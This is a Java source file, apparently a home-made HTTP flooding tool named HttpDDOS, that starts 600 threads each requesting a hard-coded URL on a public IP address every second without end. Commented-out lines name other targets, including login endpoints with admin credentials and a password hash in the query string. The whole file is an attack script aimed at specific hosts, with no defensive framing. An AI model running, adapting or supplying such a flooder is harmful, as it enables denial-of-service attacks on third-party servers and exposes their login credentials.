package com.sun.http;

import java.util.concurrent.atomic.AtomicInteger;

public class HttpDDOS implements Runnable {

    private static AtomicInteger atomicInteger = new AtomicInteger();

    @Override
    public void run() {
        while (true) {
            //String URL = "http://175.19.155.39/chk/gainchkcode.do?custno=1&username=a&password2=1";
            //String URL = "http://172.16.0.146:8086/eMWX2.0-YT/ex/user/login.do?userid=admin&pwd=e10adc3949ba59abbe56e057f20f883e&dynamic_code=&client_token=&host=";
            //String URL = "http://172.16.1.108:8084/eMWX2.0-TM/ex/user/login.do?userid=admin&pwd=e10adc3949ba59abbe56e057f20f883e&dynamic_code=&client_token=&host=";
            //String URL = "http://172.16.0.146:8066/project/eMWX2.0-YT/";
            //String URL = "http://8.131.66.1:15672/login?username=admin&password=123456";
            //String URL = "http://8.131.66.1";
            String URL = "http://8.131.66.1:15672/";
            HttpUtil.doGet(URL);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            //System.out.println(HttpUtil.doGet(URL) + "   " /*+ atomicInteger.incrementAndGet()*/);
        }
    }
}

class Main1 {

    public static void main(String[] args) {

        for (int i = 0; i < 600; i++) {
            HttpDDOS main = new HttpDDOS();
            Thread thread = new Thread(main);
            thread.start();
        }

    }
}